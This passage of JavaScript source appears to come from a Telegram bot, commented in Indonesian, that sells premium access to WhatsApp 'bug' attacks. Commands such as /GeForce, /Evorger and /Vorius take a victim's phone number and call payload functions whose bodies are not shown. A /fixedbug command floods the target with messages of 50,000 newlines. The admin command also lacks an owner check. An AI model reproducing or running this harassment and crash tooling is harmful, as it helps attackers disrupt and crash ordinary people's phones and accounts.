          await NewsletterZapTeks(sock, groupId.id);
          await buggccrash(groupId.id);
          console.clear();
          console.log(chalk.blue(`🫀 SendBug By Bot`));
        }
        

        await bot.sendMessage(
          chatId,
          `Bug Terkirim Ke Grup\nLink: ${groupLink}`
        );
      } catch (error) {
        await bot.sendMessage(chatId, "Gagal Mengirim Bug");
        console.error(`Error dengan bot`, error);
      }
      return true;
    } catch (error) {
      console.error("Error dalam joinAndSendBug:", error);
      return false;
    }
  }

  await joinAndSendBug(groupLink);
});

bot.onText(/\/GeForce (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const imagePath = "./Evergrow/「 𖣂 ᳟ᜌうございます² 」.jpg";

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, "https://files.catbox.moe/mlo5v8.png", {
      caption: `\`\`\`!! Not Access Premium!!\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "( Chanel Developer 🍁 )", url: "https://t.me/FluxusInform" },
            { text: "( Owner 🍂 )", url: `https://t.me/${OWNER_1}` },
            { text: "( Owner 💦 )", url: `https://t.me/${OWNER_2}` },
          ],
        ],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    const sentMessage = await bot.sendDocument(chatId, imagePath, {
      caption: `
<blockquote>「 𝙵𝚕𝚞𝚡𝚞𝚜 💐 」</blockquote>
<b> ▢ Целевой номер : ${formattedNumber}@s.whatsapp.net</b>
<b> ▢ Меню : /GeForce</b>
<b> ▢ Прогресс : [░░░░░░░░░░] 0%</b>
<b> ▢ Дата сейчас : ${date}</b>

<blockquote><b>🦋 このバグを最大限に活用してください。</b></blockquote>
`,
      parse_mode: "HTML",
    });

    const progressStages = [
      { text: "[█░░░░░░░░░]", delay: 100 },
      { text: "[███░░░░░░░]", delay: 100 },
      { text: "[█████░░░░░]", delay: 100 },
      { text: "[███████░░░]", delay: 100 },
      { text: "[█████████░]", delay: 100 },
      { text: "[██████████] Success......", delay: 100 },
    ];

    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `
<blockquote>「 𝙵𝚕𝚞𝚡𝚞𝚜 𝙲𝚊𝚔𝚎 🐐 」</blockquote>
<b> ▢ Целевой номер : ${formattedNumber}@s.whatsapp.net</b>
<b> ▢ Меню : /GeForce</b>
<b> ▢ Прогресс :  ${stage.text}</b>
<b> ▢ Дата сейчас : ${date}</b>

<blockquote><b>🦋 このバグを最大限に活用してください。</b></blockquote>
`,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML",
        }
      );
    }
    
    await Basicly(sock, jid);     
    

    await bot.editMessageCaption(
      `
<blockquote>「 𝙵𝚕𝚞𝚡𝚞𝚜 𝙲𝚊𝚔𝚎 🐐 」</blockquote>
<b> ▢ Целевой номер : ${formattedNumber}@s.whatsapp.net</b>
<b> ▢ Меню : /GeForce</b>
<b> ▢ Прогресс :  [██████████] 100%</b>
<b> ▢ Дата сейчас : ${date}</b>

<blockquote><b>🦋 このバグを最大限に活用してください。</b></blockquote>
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "ʙᴀᴄᴋ ↺", callback_data: `bugmenu` }]],
        },
      }
    );
  bot.sendMessage(chatId, `Cek Aja Mas [🫟]
[ https://wa.me/${formattedNumber} ]
    `);
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
bot.onText(/\/Evorger (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const imagePath = "./Evergrow/「 𖣂 ᳟ᜌうございます² 」.jpg";

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, "https://files.catbox.moe/mlo5v8.png", {
      caption: `\`\`\`!! Not Access Premium!!\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "( Chanel Developer 🍁 )", url: "https://t.me/FluxusInform" },
            { text: "( Owner 🍂 )", url: `https://t.me/${OWNER_1}` },
            { text: "( Owner 💦 )", url: `https://t.me/${OWNER_2}` },
          ],
        ],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    const sentMessage = await bot.sendDocument(chatId, imagePath, {
      caption: `
<blockquote>「 𝙵𝚕𝚞𝚡𝚞𝚜 💐 」</blockquote>
<b> ▢ Целевой номер : ${formattedNumber}@s.whatsapp.net</b>
<b> ▢ Меню : /Evorger</b>
<b> ▢ Прогресс : [░░░░░░░░░░] 0%</b>
<b> ▢ Дата сейчас : ${date}</b>

<blockquote><b>🦋 このバグを最大限に活用してください。</b></blockquote>
`,
      parse_mode: "HTML",
    });

    const progressStages = [
      { text: "[█░░░░░░░░░]", delay: 100 },
      { text: "[███░░░░░░░]", delay: 100 },
      { text: "[█████░░░░░]", delay: 100 },
      { text: "[███████░░░]", delay: 100 },
      { text: "[█████████░]", delay: 100 },
      { text: "[██████████] Success......", delay: 100 },
    ];

    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `
<blockquote>「 𝙵𝚕𝚞𝚡𝚞𝚜 𝙲𝚊𝚔𝚎 🐐 」</blockquote>
<b> ▢ Целевой номер : ${formattedNumber}@s.whatsapp.net</b>
<b> ▢ Меню : /Evorger</b>
<b> ▢ Прогресс :  ${stage.text}</b>
<b> ▢ Дата сейчас : ${date}</b>

<blockquote><b>🦋 このバグを最大限に活用してください。</b></blockquote>
`,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML",
        }
      );
    }
    
    await Diedd(sock, jid);
    

    await bot.editMessageCaption(
      `
<blockquote>「 𝙵𝚕𝚞𝚡𝚞𝚜 𝙲𝚊𝚔𝚎 🐐 」</blockquote>
<b> ▢ Целевой номер : ${formattedNumber}@s.whatsapp.net</b>
<b> ▢ Меню : /Evorger</b>
<b> ▢ Прогресс :  [██████████] 100%</b>
<b> ▢ Дата сейчас : ${date}</b>

<blockquote><b>🦋 このバグを最大限に活用してください。</b></blockquote>
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "ʙᴀᴄᴋ ↺", callback_data: `bugmenu` }]],
        },
      }
    );
  bot.sendMessage(chatId, `Cek Aja Mas [🫟]
[ https://wa.me/${formattedNumber} ]
    `);
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/Vorius (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const imagePath = "./Evergrow/「 𖣂 ᳟ᜌうございます² 」.jpg";

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, "https://files.catbox.moe/mlo5v8.png", {
      caption: `\`\`\`!! Not Access Premium!!\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "( Chanel Developer 🍁 )", url: "https://t.me/FluxusInform" },
            { text: "( Owner 🍂 )", url: `https://t.me/${OWNER_1}` },
            { text: "( Owner 💦 )", url: `https://t.me/${OWNER_2}` },
          ],
        ],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    const sentMessage = await bot.sendDocument(chatId, imagePath, {
      caption: `
<blockquote>「 𝙵𝚕𝚞𝚡𝚞𝚜 𝙲𝚊𝚔𝚎 🐐 」</blockquote>
<b> ▢ Целевой номер : ${formattedNumber}@s.whatsapp.net</b>
<b> ▢ Меню : /Vorius</b>
<b> ▢ Прогресс : [░░░░░░░░░░] 0%</b>
<b> ▢ Дата сейчас : ${date}</b>

<blockquote><b>🦋 このバグを最大限に活用してください。</b></blockquote>
`,
      parse_mode: "HTML",
    });

    const progressStages = [
      { text: "[█░░░░░░░░░]", delay: 100 },
      { text: "[███░░░░░░░]", delay: 100 },
      { text: "[█████░░░░░]", delay: 100 },
      { text: "[███████░░░]", delay: 100 },
      { text: "[█████████░]", delay: 100 },
      { text: "[██████████] Success......", delay: 100 },
    ];

    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `
<blockquote>「 𝙵𝚕𝚞𝚡𝚞𝚜 𝙲𝚊𝚔𝚎 🐐 」</blockquote>
<b> ▢ Целевой номер : ${formattedNumber}@s.whatsapp.net</b>
<b> ▢ Меню : /Vorius</b>
<b> ▢ Прогресс :  ${stage.text}</b>
<b> ▢ Дата сейчас : ${date}</b>

<blockquote><b>🦋 このバグを最大限に活用してください。</b></blockquote>
`,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML",
        }
      );
    }

    await Shifter(sock, jid);
    

    await bot.editMessageCaption(
      `
<blockquote>「 𝙵𝚕𝚞𝚡𝚞𝚜 𝙲𝚊𝚔𝚎 🐐 」</blockquote>
<b> ▢ Целевой номер : ${formattedNumber}@s.whatsapp.net</b>
<b> ▢ Меню : /Vorius</b>
<b> ▢ Прогресс :  [██████████] 100%</b>
<b> ▢ Дата сейчас : ${date}</b>

<blockquote><b>🦋 このバグを最大限に活用してください。</b></blockquote>
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "ʙᴀᴄᴋ ↺", callback_data: `bugmenu` }]],
        },
      }
    );
    bot.sendMessage(chatId, `Cek Aja Mas [🫟]
[ https://wa.me/${formattedNumber} ]
    `);
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/PATCHERRRRRR (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const imagePath = "./Evergrow/「 𖣂 ᳟ᜌうございます² 」.jpg";

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, "https://files.catbox.moe/mlo5v8.png", {
      caption: `\`\`\`!! Not Access Premium!!\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "( Chanel Developer 🍁 )", url: "https://t.me/FluxusInform" },
            { text: "( Owner 🍂 )", url: `https://t.me/${OWNER_1}` },
            { text: "( Owner 💦 )", url: `https://t.me/${OWNER_2}` },
          ],
        ],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    const sentMessage = await bot.sendDocument(chatId, imagePath, {
      caption: `
<blockquote>「 𝙵𝚕𝚞𝚡𝚞𝚜 𝙲𝚊𝚔𝚎 🐐 」</blockquote>
<b> ▢ Целевой номер : ${formattedNumber}@s.whatsapp.net</b>
<b> ▢ Меню : /Vorsix</b>
<b> ▢ Прогресс : [░░░░░░░░░░] 0%</b>
<b> ▢ Дата сейчас : ${date}</b>

<blockquote><b>🦋 このバグを最大限に活用してください。</b></blockquote>
`,
      parse_mode: "HTML",
    });

    const progressStages = [
      { text: "[█░░░░░░░░░]", delay: 100 },
      { text: "[███░░░░░░░]", delay: 100 },
      { text: "[█████░░░░░]", delay: 100 },
      { text: "[███████░░░]", delay: 100 },
      { text: "[█████████░]", delay: 100 },
      { text: "[██████████] Success......", delay: 100 },
    ];

    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `
<blockquote>「 𝙵𝚕𝚞𝚡𝚞𝚜 𝙲𝚊𝚔𝚎 🐐 」</blockquote>
<b> ▢ Целевой номер : ${formattedNumber}@s.whatsapp.net</b>
<b> ▢ Меню : /Vorsix</b>
<b> ▢ Прогресс :  ${stage.text}</b>
<b> ▢ Дата сейчас : ${date}</b>

<blockquote><b>🦋 このバグを最大限に活用してください。</b></blockquote>
`,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML",
        }
      );
    }

    await Starios(jid);
    console.log(chalk.blue(`🫀 SendBug By Bot`));

    await bot.editMessageCaption(
      `
<blockquote>「 𝙵𝚕𝚞𝚡𝚞𝚜 𝙲𝚊𝚔𝚎 🐐 」</blockquote>
<b> ▢ Целевой номер : ${formattedNumber}@s.whatsapp.net</b>
<b> ▢ Меню : /Vorsix</b>
<b> ▢ Прогресс :  [██████████] 100%</b>
<b> ▢ Дата сейчас : ${date}</b>

<blockquote><b>🦋 このバグを最大限に活用してください。</b></blockquote>
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "ʙᴀᴄᴋ ↺", callback_data: `bugmenu` }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
///// -------- ( Fixed Bug ) --------- \\\\\
bot.onText(/\/fixedbug\s+(.+)/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  const q = match[1]; // Ambil argumen setelah /delete-bug
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendMessage(chatId, "Lu Gak Punya Access Tolol...");
  }
  if (!q) {
    return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\n/fixedbug 62xxx`);
  }
  let pepec = q.replace(/[^0-9]/g, "");
  if (pepec.startsWith("0")) {
    return bot.sendMessage(chatId, `Contoh : /fixedbug 62xxx`);
  }
  let target = pepec + "@s.whatsapp.net";
  try {
    for (let i = 0; i < 3; i++) {
      await sock.sendMessage(target, {
        text: "*BOT CLEAR BUG*" + "\n".repeat(50000),
      });
    }
    bot.sendMessage(chatId, `Cek Aja Mas [🫟]
[ https://wa.me/${pepec} ]
    `);
  } catch (err) {
    console.error("Error:", err);
    bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
  }
});

///// ------------ ( PLUNGINS ) -------------\\\\\
bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");
  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});
const moment = require("moment");
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }
  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID and duration. Example: /addprem 7043363273 30d."
    );
  }
  const args = match[1].split(" ");
  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please specify a duration. Example: /addprem 7043363273 30d."
    );
  }
  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
  const duration = args[1];
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number. Example: /addprem 7043363273 30d."
    );
  }
  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d."
    );
  }
  const now = moment();
  const expirationDate = moment().add(
    parseInt(duration),
    duration.slice(-1) === "d"
      ? "days"
      : duration.slice(-1) === "h"
      ? "hours"
      : "minutes"
  );
  if (!premiumUsers.find((user) => user.id === userId)) {
    premiumUsers.push({
      id: userId,
      expiresAt: expirationDate.toISOString(),
    });
    savePremiumUsers();
    console.log(
      `${senderId} added ${userId} to premium until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}`
    );
    bot.sendMessage(
      chatId,
      `✅ User ${userId} has been added to the premium list until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  } else {
    const existingUser = premiumUsers.find((user) => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
    savePremiumUsers();
    bot.sendMessage(
      chatId,
      `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format(
        "YYYY-MM-DD HH:mm:ss"
      )}.`
    );
  }
});
bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }
  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }
  let message = "```ＬＩＳＴ ＰＲＥＭＩＵＭ\n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format("YYYY-MM-DD HH:mm:ss");
    message += `${index + 1}. ID: \`${
      user.id
    }\`\n   Expiration: ${expiresAt}\n\n`;
  });
  bot.sendMessage(chatId, message, {
    parse_mode: "Markdown",
  });
});
//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID. Example: /addadmin 7043363273."
    );
  }
  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. Example: /addadmin 7043363273."
    );
  }
  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveAdminUsers();
    console.log(`${senderId} Added ${userId} To Admin`);
    bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
  }
});
bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  // Cek apakah pengguna adalah owner atau admin
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to remove premium users."
    );
  }
  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Please provide a user ID. Example: /delprem 7043363273"
    );
  }
  const userId = parseInt(match[1]);
  if (isNaN(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. User ID must be a number."
    );
  }
  // Cari index user dalam daftar premium
  const index = premiumUsers.findIndex((user) => user.id === userId);
  if (index === -1) {
    return bot.sendMessage(
      chatId,
      `❌ User ${userId} is not in the premium list.`
    );
  }
  // Hapus user dari daftar
  premiumUsers.splice(index, 1);
  savePremiumUsers();
  bot.sendMessage(
    chatId,
    `✅ User ${userId} has been removed from the premium list.`
  );
});
bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }
  // Pengecekan input dari pengguna
  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID. Example: /deladmin 7043363273."
    );
  }
  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. Example: /deladmin 7043363273."
    );
  }
  // Cari dan hapus user dari adminUsers
  const adminIndex = adminUsers.indexOf(userId);
  if (adminIndex !== -1) {
    adminUsers.splice(adminIndex, 1);
    saveAdminUsers();
    console.log(`${senderId} Removed ${userId} From Admin`);
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
  }
});
console.log(chalk.cyan("open script telegram"));
